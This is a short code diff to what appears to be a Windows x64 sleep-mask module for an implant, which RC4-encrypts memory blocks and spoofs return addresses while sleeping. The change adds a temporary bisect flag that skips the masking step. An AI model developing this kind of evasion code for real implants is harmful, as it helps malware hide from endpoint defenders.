@@ -9,6 +9,8 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
+#define G3_BISECT_C  /* temporary bisect: revert after */
+
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -444,7 +446,11 @@ BOOL gen3_sleep(DWORD time)
 			k[i] = bigger_rand();
 	}
 
+#if defined(G3_BISECT_C)
+	nblocks = 0; /* bisect round 3: ROP only, no masking */
+#else
 	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
+#endif
 
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
